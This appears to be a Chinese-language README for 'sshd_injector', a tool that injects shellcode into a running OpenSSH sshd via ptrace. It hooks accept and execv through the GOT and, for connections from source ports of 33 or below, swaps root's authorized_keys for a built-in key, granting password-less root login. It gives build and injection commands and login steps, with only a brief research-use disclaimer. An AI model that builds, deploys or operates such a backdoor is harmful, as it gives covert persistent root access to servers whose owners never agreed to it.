# sshd_injector

---

## 项目简介

**sshd_injector** 是一个用于向系统 `sshd`（OpenSSH 服务器）进程注入后门的工具。它通过利用 Linux 的 `ptrace` 技术，将自定义代码钩子写入正在运行的 sshd 进程，从而实现无需密码即可 root 登录的隐藏后门。

---

## 实现原理

- 通过 `ptrace` 附加到目标 `sshd` 进程。
- 在 `sshd` 进程中寻找合适的空闲可执行内存，并注入自定义 shellcode。  
  *（注意：如 `sshd` 进程的可执行内存空间不足以容纳 shellcode，请关注后续 TODO 修复）*
- 替换 GOT（全局偏移表）中的 `accept` 和 `execv` 函数指针为自定义钩子逻辑：
  - **accept 钩子**：检测连接的端口号，若端口 ≤ 33，则设置后门标志位。
  - **execv 钩子**：在后门标志激活时，对 `sshd` 的子进程 `sshd-session` 执行 `ptrace`，在检测到对 `/root/.ssh/authorized_keys` 的 read 调用后，将其内容替换为内置 SSH 公钥（如 `ssh-ed25519 ... root`）。
- 利用上述机制，可通过特定端口和后门密钥无条件获取 root 权限。

---

## 使用方法

### 1. 编译 injector

```bash
make
```

---

### 2. 注入 sshd

```bash
./build/injector $(pgrep sshd)
```

---

### 3. 后门 SSH 登录

- 使用项目生成的 `./the_backdoor_key` 作为 SSH 私钥。
- SSH 客户端连接目标服务器时，**端口号需小于等于 33**。
- 即可无条件获得 root 登录权限。

---

> ⚠️ **警告：本项目仅供安全研究、学习与测试用途。请勿在未授权环境下使用，否则后果自负。**

---
